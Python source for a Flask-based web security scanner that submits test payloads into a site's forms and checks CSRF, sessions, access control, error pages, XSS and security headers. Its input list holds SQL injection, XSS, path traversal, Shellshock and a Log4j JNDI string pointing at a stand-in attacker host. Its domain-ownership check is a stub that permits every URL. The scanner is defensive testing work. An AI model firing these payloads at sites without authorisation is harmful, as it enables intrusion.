from flask import Flask, request, jsonify, render_template
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException, TimeoutException, ElementNotInteractableException, InvalidElementStateException
from selenium.webdriver.common.action_chains import ActionChains
import time
import logging
import re
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
# Initialize Flask app
app = Flask(__name__)

# Configure logging
logging.basicConfig(filename='security_tests.log', level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

def requests_retry_session(
    retries=3,
    backoff_factor=0.3,
    status_forcelist=(500, 502, 504),
    session=None,
):
    session = session or requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

# Helper function to setup headless browser
def setup_headless_browser():
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-software-rasterizer")  # Disable software rasterizer
    chrome_options.add_argument("--disable-gpu-compositing")  # Ensure GPU compositing is disabled
    chrome_options.add_argument("--window-size=1920x1080")  # Set a default window size to ensure element rendering
    return webdriver.Chrome(options=chrome_options)



# Helper function to validate URL
def validate_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

# Helper function to check domain ownership (dummy function)
def check_domain_ownership(url):
    # In a real-world application, this should verify the user owns the domain.
    # For now, it assumes all URLs are owned by the user.
    return True

# Function to perform security tests
def run_security_tests(url):
    results = {}
    driver = None

    if not validate_url(url):
        return {'error': 'Invalid URL format.'}

    if not check_domain_ownership(url):
        return {'error': 'Unauthorized domain. You do not have permission to test this URL.'}

    logging.info(f"Running security tests on {url}")

    try:
        driver = setup_headless_browser()

        # Convert manual checks to automated
        results['input_validation'] = check_input_validation(driver, url)
        results['csrf_protection'] = check_csrf_protection(driver, url)
        results['auth_session'] = check_auth_session(driver, url)
        results['access_control'] = check_access_control(driver, url)
        results['error_handling'] = check_error_handling(driver, url)

        # Existing automated checks
        results['xss_protection'] = check_xss_protection(url)
        results['https'] = check_https(url)
        results['security_headers'] = check_security_headers(url)

        logging.info(f"Security tests completed successfully for {url}")

    except Exception as e:
        logging.error(f"Error during security testing: {str(e)}")
        results['error'] = {
            'description': 'An error occurred during security testing.',
            'status': 'Error',
            'details': str(e)
        }
    finally:
        if driver:
            driver.quit()

    return results

# Retry mechanism to improve reliability
def retry(func, retries=3, delay=2):
    for _ in range(retries):
        try:
            return func()
        except Exception as e:
            logging.warning(f"Retry failed: {str(e)}")
            time.sleep(delay)
    raise Exception("Maximum retries reached")

# Test function for CSRF protection
def check_csrf_protection(driver, url):
    try:
        driver.get(url)
        
        # Wait for the page to load
        try:
            WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        except TimeoutException:
            return {
                'description': 'Checks for CSRF token implementation.',
                'status': 'Error',
                'details': 'Timeout while loading the page.'
            }

        csrf_protections = {
            'token_in_session': False,
            'token_in_js': False,
            'token_in_meta': False,
            'samesite_cookie': False
        }

        # Check for CSRF token in JavaScript
        js_content = driver.execute_script("return document.documentElement.outerHTML;")
        if re.search(r"let\s+csrfToken\s*=\s*'[a-f0-9]{64}'", js_content):
            csrf_protections['token_in_js'] = True

        # Check for CSRF meta tags
        meta_csrf = driver.find_elements(By.CSS_SELECTOR, "meta[name='csrf-token']")
        if meta_csrf:
            csrf_protections['token_in_meta'] = True

        # Check for SameSite cookie attribute
        cookies = driver.get_cookies()
        for cookie in cookies:
            if cookie.get('sameSite') in ['Strict', 'Lax']:
                csrf_protections['samesite_cookie'] = True
                break

        # Check PHP session for CSRF token (indirect check)
        if re.search(r"\$_SESSION\['csrf_token'\]\s*=\s*bin2hex\(random_bytes\(32\)\);", js_content):
            csrf_protections['token_in_session'] = True

        # Determine the overall CSRF protection status
        if csrf_protections['token_in_session'] or csrf_protections['token_in_js']:
            status = 'Good'
            details = 'CSRF token found in PHP session and/or JavaScript, providing strong protection.'
        elif csrf_protections['token_in_meta']:
            status = 'Good'
            details = 'CSRF token found in meta tag, providing good protection.'
        elif csrf_protections['samesite_cookie']:
            status = 'Fair'
            details = 'No explicit CSRF tokens found, but SameSite cookie attribute is used, providing some protection.'
        else:
            status = 'Poor'
            details = 'No CSRF tokens or alternative protections found. The site may be vulnerable to CSRF attacks.'

        details += ' Protections found: ' + ', '.join([k for k, v in csrf_protections.items() if v])

        return {
            'description': 'Checks for CSRF token implementation.',
            'status': status,
            'details': details,
            'protections': csrf_protections
        }

    except Exception as e:
        return {
            'description': 'Checks for CSRF token implementation.',
            'status': 'Error',
            'details': f'Error occurred while checking: {str(e)}'
        }


# Test function for input validation
def check_input_validation(driver, url):
    try:
        driver.get(url)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        
        test_inputs = [
            ("'", "SQL Injection"),
            ("<script>alert('XSS')</script>", "XSS"),
            ("1 OR 1=1", "SQL Injection"),
            ("../../../etc/passwd", "Path Traversal"),
            ("${jndi:ldap://attacker.com/a}", "Log4j"),
            ("() { :; }; echo vulnerable", "Shellshock"),
            ("%0ASet-Cookie: sessionid=abcdef123456", "HTTP Header Injection")
        ]
        
        vulnerabilities = []
        
        def is_element_interactable(element):
            try:
                return element.is_displayed() and element.is_enabled()
            except StaleElementReferenceException:
                return False

        def interact_with_form(form, input_field, test_input):
            try:
                if not is_element_interactable(input_field):
                    return False
                
                # Store the current URL
                original_url = driver.current_url
                
                # Interact with the form
                driver.execute_script("arguments[0].scrollIntoView(true);", input_field)
                time.sleep(0.5)
                driver.execute_script("arguments[0].value = arguments[1];", input_field, test_input)
                driver.execute_script("arguments[0].submit();", form)
                
                # Wait for page load
                WebDriverWait(driver, 10).until(
                    lambda d: d.execute_script('return document.readyState') == 'complete'
                )
                
                # Check if the URL has changed
                url_changed = driver.current_url != original_url
                
                return driver.page_source, url_changed
            except Exception as e:
                logging.warning(f"Error interacting with form: {str(e)}")
                return None, False

        def analyze_response(response, url_changed, test_input, vuln_type):
            if not response:
                return None
            
            soup = BeautifulSoup(response, 'html.parser')
            
            # Remove script and style elements
            for script in soup(["script", "style"]):
                script.decompose()
            
            visible_text = soup.get_text().lower()
            
            # More specific detection patterns
            sql_patterns = [
                r"sql syntax",
                r"mysql error",
                r"ora-\d{5}",
                r"sql server error"
            ]
            xss_patterns = [
                r"<script>alert\('XSS'\)</script>"
            ]
            path_traversal_patterns = [
                r"root:.*:0:0:",
                r"win.ini"
            ]
            
            if vuln_type == "SQL Injection" and any(re.search(pattern, visible_text) for pattern in sql_patterns):
                return "High likelihood of SQL Injection vulnerability"
            elif vuln_type == "XSS" and any(re.search(pattern, response) for pattern in xss_patterns):
                return "High likelihood of XSS vulnerability"
            elif vuln_type == "Path Traversal" and any(re.search(pattern, visible_text) for pattern in path_traversal_patterns):
                return "High likelihood of Path Traversal vulnerability"
            elif "error" in visible_text and test_input.lower() in visible_text:
                return f"Potential {vuln_type} vulnerability - input reflected in error message"
            elif url_changed and any(keyword in urlparse(driver.current_url).path.lower() for keyword in ["error", "invalid", "failure"]):
                return f"Potential {vuln_type} vulnerability - redirected to error page"
            
            return None

        forms = driver.find_elements(By.TAG_NAME, "form")
        for form_index, form in enumerate(forms, 1):
            form_action = form.get_attribute('action') or 'No action specified'
            form_method = form.get_attribute('method') or 'GET'
            inputs = form.find_elements(By.TAG_NAME, "input")
            
            for input_index, input_field in enumerate(inputs, 1):
                if not is_element_interactable(input_field):
                    continue
                
                input_name = input_field.get_attribute('name') or f'Unnamed input {input_index}'
                input_type = input_field.get_attribute('type') or 'text'
                
                if input_type in ['submit', 'button', 'hidden', 'file']:
                    continue
                
                for test_input, vuln_type in test_inputs:
                    response, url_changed = interact_with_form(form, input_field, test_input)
                    
                    if response:
                        analysis_result = analyze_response(response, url_changed, test_input, vuln_type)
                        if analysis_result:
                            vulnerabilities.append({
                                "type": vuln_type,
                                "input": test_input,
                                "form_index": form_index,
                                "form_action": form_action,
                                "form_method": form_method,
                                "input_name": input_name,
                                "input_type": input_type,
                                "details": analysis_result
                            })
                    
                    # Navigate back to the original page
                    driver.back()
                    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                    
                    # Re-find the form and input after navigating back
                    forms = driver.find_elements(By.TAG_NAME, "form")
                    if form_index <= len(forms):
                        form = forms[form_index - 1]
                        inputs = form.find_elements(By.TAG_NAME, "input")
                        if input_index <= len(inputs):
                            input_field = inputs[input_index - 1]
                        else:
                            break
                    else:
                        break
        
        if vulnerabilities:
            details = "Potential vulnerabilities detected (manual verification required):\n"
            for vuln in vulnerabilities:
                details += f"- {vuln['type']} potential vulnerability detected:\n"
                details += f"  Form: #{vuln['form_index']} (Action: {vuln['form_action']}, Method: {vuln['form_method']})\n"
                details += f"  Input: {vuln['input_name']} (Type: {vuln['input_type']})\n"
                details += f"  Test Input: {vuln['input']}\n"
                details += f"  Details: {vuln['details']}\n\n"
            
            return {
                'description': 'Checks for proper input validation and sanitization.',
                'status': 'Potential Issues Found',
                'details': details
            }
        else:
            return {
                'description': 'Checks for proper input validation and sanitization.',
                'status': 'Good',
                'details': 'No obvious input validation issues detected.'
            }
    except Exception as e:
        return {
            'description': 'Checks for proper input validation and sanitization.',
            'status': 'Error',
            'details': f'Error occurred while checking: {str(e)}'
        }


# Test function for error handling
def check_error_handling(driver, url):
    results = []
    
    def check_error_page(path, expected_status):
        try:
            test_url = urljoin(url, path)
            
            # First, use requests to check the status code
            response = requests_retry_session().get(test_url, allow_redirects=False)
            actual_status = response.status_code
            
            # Then use Selenium for content analysis
            driver.get(test_url)
            
            try:
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
            except TimeoutException:
                return {
                    'path': path,
                    'expected_status': expected_status,
                    'actual_status': 'Timeout',
                    'details': 'Timeout while loading the page.'
                }

            page_source = driver.page_source.lower()
            title = driver.title.lower()

            # Check for custom error page
            error_patterns = [r'404', r'not found', r'error', r'exception', r'stack trace', r'debug', r'unexpected', r'sorry']
            error_indicators = [pattern for pattern in error_patterns if re.search(pattern, page_source + title)]

            # Check for sensitive information
            sensitive_info = ["exception", "stack trace", "debug", "sql", "database", "server error", "internal server", "syntax error"]
            exposed_info = [info for info in sensitive_info if info in page_source]

            if actual_status == expected_status and error_indicators and not exposed_info:
                status = 'Good'
                details = f'Proper error page found (Status: {actual_status}) without sensitive information.'
            elif actual_status != expected_status:
                status = 'Poor'
                details = f'Unexpected status code. Expected {expected_status}, got {actual_status}.'
            elif exposed_info:
                status = 'Poor'
                details = f'Error page may expose sensitive information: {", ".join(exposed_info)}'
            elif not error_indicators:
                status = 'Fair'
                details = f'Status code correct ({actual_status}), but no clear error indicators on the page.'
            else:
                status = 'Fair'
                details = f'Error page found, but it may need improvement.'

            return {
                'path': path,
                'expected_status': expected_status,
                'actual_status': actual_status,
                'status': status,
                'details': details
            }
        except Exception as e:
            return {
                'path': path,
                'expected_status': expected_status,
                'actual_status': 'Error',
                'status': 'Error',
                'details': f'Error occurred while checking: {str(e)}'
            }

    # Check various error scenarios
    results.append(check_error_page("/non_existent_page_12345", 404))
    results.append(check_error_page("/index.php", 404))  # Assuming PHP is not used
    results.append(check_error_page("/.htaccess", 403))
    results.append(check_error_page("/server-status", 403))

    # Analyze results
    overall_status = 'Good' if all(r['status'] == 'Good' for r in results) else 'Poor'
    
    return {
        'description': 'Checks for proper error handling across various scenarios.',
        'status': overall_status,
        'details': results
    }

# Test function for access control
def check_access_control(driver, url):
    restricted_paths = ["/admin", "/dashboard", "/user/profile", "/settings"]
    results = []
    
    try:
        for path in restricted_paths:
            full_url = urljoin(url, path)
            driver.get(full_url)
            
            try:
                # Wait for the page to load or for a potential 404 error
                WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                
                # Check if it's a 404 error
                if "404" in driver.title.lower() or "not found" in driver.page_source.lower():
                    results.append({
                        'path': path,
                        'status': 'Inconclusive',
                        'details': f'Path "{path}" returns a 404 error. Unable to determine access control.'
                    })
                # Check if redirected to login page or access denied
                elif "login" in driver.current_url.lower() or "unauthorized" in driver.page_source.lower():
                    results.append({
                        'path': path,
                        'status': 'Good',
                        'details': f'Restricted area "{path}" properly protected.'
                    })
                else:
                    results.append({
                        'path': path,
                        'status': 'Poor',
                        'details': f'Potential unauthorized access to "{path}".'
                    })
            except TimeoutException:
                results.append({
                    'path': path,
                    'status': 'Error',
                    'details': f'Timeout while accessing "{path}". Unable to determine access control.'
                })

        # Determine overall status
        statuses = [r['status'] for r in results]
        if all(status == 'Good' for status in statuses):
            overall_status = 'Good'
        elif all(status in ['Good', 'Inconclusive'] for status in statuses):
            overall_status = 'Fair'
        elif 'Poor' in statuses:
            overall_status = 'Poor'
        else:
            overall_status = 'Inconclusive'

        return {
            'description': 'Checks for proper access control implementation.',
            'status': overall_status,
            'details': results
        }
    except Exception as e:
        return {
            'description': 'Checks for proper access control implementation.',
            'status': 'Error',
            'details': f'Error occurred while checking: {str(e)}'
        }

# Test function for session management
def check_auth_session(driver, url):
    try:
        driver.get(url)
        
        # Wait for the page to load or for a potential 404 error
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
        except TimeoutException:
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Error',
                'details': 'Timeout while loading the page. Unable to perform authentication check.'
            }
        
        # Check if it's a 404 error
        if "404" in driver.title.lower() or "not found" in driver.page_source.lower():
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Inconclusive',
                'details': 'The page returns a 404 error. Unable to perform authentication check.'
            }
        
        # Look for login form
        try:
            login_form = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "form[action*='login']"))
            )
        except TimeoutException:
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Inconclusive',
                'details': 'Could not find a login form to test.'
            }
        
        # Attempt login with dummy credentials
        try:
            username_field = driver.find_element(By.NAME, "username")
            password_field = driver.find_element(By.NAME, "password")
            username_field.send_keys("testuser")
            password_field.send_keys("testpassword")
            login_form.submit()
        except NoSuchElementException:
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Inconclusive',
                'details': 'Could not find username or password fields in the login form.'
            }
        
        # Wait for the page to load after login attempt
        try:
            WebDriverWait(driver, 10).until(
                EC.staleness_of(login_form)
            )
        except TimeoutException:
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Inconclusive',
                'details': 'Page did not change after login attempt. Unable to determine if login was successful.'
            }
        
        # Check for session cookie
        cookies = driver.get_cookies()
        session_cookie = next((cookie for cookie in cookies if 'session' in cookie['name'].lower()), None)
        
        if session_cookie:
            # Test session persistence
            driver.delete_cookie(session_cookie['name'])
            driver.refresh()
            
            if "login" in driver.current_url.lower():
                return {
                    'description': 'Checks authentication and session management.',
                    'status': 'Good',
                    'details': 'Session appears to be properly managed.'
                }
            else:
                return {
                    'description': 'Checks authentication and session management.',
                    'status': 'Poor',
                    'details': 'Session persists after cookie deletion.'
                }
        else:
            return {
                'description': 'Checks authentication and session management.',
                'status': 'Poor',
                'details': 'No session cookie found after login attempt.'
            }
    except Exception as e:
        return {
            'description': 'Checks authentication and session management.',
            'status': 'Error',
            'details': f'Error occurred while checking: {str(e)}'
        }

# Test function for XSS protection
def check_xss_protection(url):
    try:
        response = requests_retry_session().get(url)
        headers = response.headers
        csp = headers.get('Content-Security-Policy')
        xss_protection = headers.get('X-XSS-Protection')

        # Analyze CSP
        csp_analysis = analyze_csp(csp) if csp else "No Content Security Policy found."

        # Check for reflected XSS
        xss_payload = "<script>alert('XSS')</script>"
        xss_response = requests_retry_session().get(url, params={"q": xss_payload})
        reflected_xss = xss_payload in xss_response.text

        if csp and not reflected_xss:
            return {
                'description': 'Checks for XSS protection measures.',
                'status': 'Good',
                'details': f'CSP is implemented and no reflected XSS detected. CSP Analysis: {csp_analysis}'
            }
        elif csp or not reflected_xss:
            return {
                'description': 'Checks for XSS protection measures.',
                'status': 'Fair',
                'details': f'Some XSS protection measures are in place, but improvements are recommended. CSP Analysis: {csp_analysis}'
            }
        else:
            return {
                'description': 'Checks for XSS protection measures.',
                'status': 'Poor',
                'details': f'No effective XSS protection measures detected. Reflected XSS might be possible. CSP Analysis: {csp_analysis}'
            }
    except requests.RequestException:
        return {
            'description': 'Checks for XSS protection measures.',
            'status': 'Error',
            'details': 'Failed to connect to the website.'
        }

def analyze_csp(csp):
    directives = csp.split(';')
    analysis = []
    for directive in directives:
        if 'unsafe-inline' in directive or 'unsafe-eval' in directive:
            analysis.append(f"Warning: {directive.strip()} allows potentially unsafe practices.")
        elif '*' in directive:
            analysis.append(f"Warning: {directive.strip()} uses a wildcard, which may be overly permissive.")
        else:
            analysis.append(f"Good: {directive.strip()} is properly restrictive.")
    return ' '.join(analysis)

# Test function for HTTPS
def check_https(url):
    try:
        response = requests_retry_session().get(url, allow_redirects=True)
        final_url = response.url

        if final_url.startswith('https://'):
            hsts = response.headers.get('Strict-Transport-Security')
            if hsts:
                return {
                    'description': 'Checks for HTTPS implementation.',
                    'status': 'Good',
                    'details': 'HTTPS is enforced and HSTS is implemented.'
                }
            else:
                return {
                    'description': 'Checks for HTTPS implementation.',
                    'status': 'Fair',
                    'details': 'HTTPS is used, but HSTS is not implemented.'
                }
        else:
            return {
                'description': 'Checks for HTTPS implementation.',
                'status': 'Poor',
                'details': 'HTTPS is not used.'
            }
    except requests.RequestException:
        return {
            'description': 'Checks for HTTPS implementation.',
            'status': 'Error',
            'details': 'Failed to connect to the website.'
        }

# Test function for security headers
def check_security_headers(url):
    try:
        response = requests_retry_session().get(url)
        headers = response.headers

        # Define the headers to check
        security_headers = {
            'X-Frame-Options': headers.get('X-Frame-Options'),
            'X-Content-Type-Options': headers.get('X-Content-Type-Options'),
            'X-XSS-Protection': headers.get('X-XSS-Protection'),
            'Referrer-Policy': headers.get('Referrer-Policy'),
            'Content-Security-Policy': headers.get('Content-Security-Policy'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security'),
            'Feature-Policy': headers.get('Feature-Policy'),
            'Permissions-Policy': headers.get('Permissions-Policy')
        }

        # Initialize lists to keep track of implemented and missing headers
        implemented_headers = []
        missing_headers = []
        details = ""

        # Check which headers are implemented and which are missing
        for header, value in security_headers.items():
            if value:
                implemented_headers.append(f"{header}: {value}")
            else:
                missing_headers.append(header)

        # Provide recommendations for missing headers
        missing_headers_recommendations = {
            'X-Frame-Options': 'This header helps protect your site against clickjacking attacks.',
            'X-Content-Type-Options': 'This header prevents MIME type sniffing, which can reduce XSS risks.',
            'Strict-Transport-Security': 'This enforces HTTPS and protects against downgrade attacks.',
            'Content-Security-Policy': 'This helps prevent XSS by specifying trusted sources of content.',
            'X-XSS-Protection': 'This header prevents some browsers from executing malicious JavaScript.',
            'Referrer-Policy': 'This controls how much referrer information is sent with requests.',
            'Feature-Policy': 'This controls which browser features are allowed on your site.',
            'Permissions-Policy': 'This controls what permissions can be granted to your site.'
        }

        # Append missing headers recommendations to details
        for header in missing_headers:
            recommendation = missing_headers_recommendations.get(header, 'No recommendation available.')
            details += f"Missing: {header} - {recommendation}\n"

        # Determine status based on how many headers are implemented
        if len(implemented_headers) >= 6:
            status = 'Good'
            details = f'Most recommended security headers are implemented.\n' + details
        elif len(implemented_headers) >= 3:
            status = 'Fair'
            details = f'Some security headers are implemented, but there is room for improvement.\n' + details
        else:
            status = 'Poor'
            details = f'Few or no recommended security headers are implemented.\n' + details

        details += f"\nImplemented: {', '.join(implemented_headers)}"

        # Return the result of the security header check
        return {
            'description': 'Checks for implementation of security headers.',
            'status': status,
            'details': details
        }

    except requests.RequestException:
        return {
            'description': 'Checks for implementation of security headers.',
            'status': 'Error',
            'details': 'Failed to connect to the website.'
        }


# Flask routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/run_tests', methods=['POST'])
def api_run_tests():
    data = request.json
    url = data.get('url')

    if not url:
        return jsonify({'error': 'No URL provided'}), 400

    results = run_security_tests(url)
    return jsonify(results)

if __name__ == '__main__':
    app.run(debug=True)
